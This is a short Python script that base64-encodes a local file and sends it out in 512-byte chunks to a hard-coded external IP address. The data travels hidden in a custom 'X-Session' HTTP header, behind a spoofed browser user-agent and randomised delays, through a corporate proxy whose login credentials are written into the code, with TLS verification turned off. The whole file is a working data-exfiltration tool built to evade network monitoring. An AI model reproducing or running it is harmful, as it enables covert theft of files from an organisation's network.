#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import base64
import time
import random


filename = 'hello'
num = 'helloworld'
size = 512
url = 'http://114.215.205.41:8088/api/test/%s' % num
# 秒
delay = 5
useragent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'
proxies = {'https': 'https://dd:!%40%23@proxy.huawei.com:8080', 'http': 'http://dd:!%40%23@proxy.huawei.com:8080',}

s = requests.Session()
s.proxies.update(proxies)
s.verify = False

def send():
    with open(filename, mode='rb') as f:
        encoding_string = base64.b64encode(f.read())

    while True:
        if len(encoding_string) > size:
            data = encoding_string[:size]
            encoding_string = encoding_string[size:]
            while True:
                try:
                    r = s.get(
                        url, headers={'X-Session': data, 'user-agent': useragent})
                    print(r.text)
                    break
                except Exception as e:
                    print("exception %s" % e)
        else:
            while True:
                try:
                    r = s.get(
                        url, headers={'X-Session': encoding_string, 'user-agent': useragent})
                    print(r.text)
                    break
                except Exception as e:
                    print("exception %s" % e)
            break
        time.sleep(random.randint(2, 3))

    print('finish')


if __name__ == '__main__':
    send()
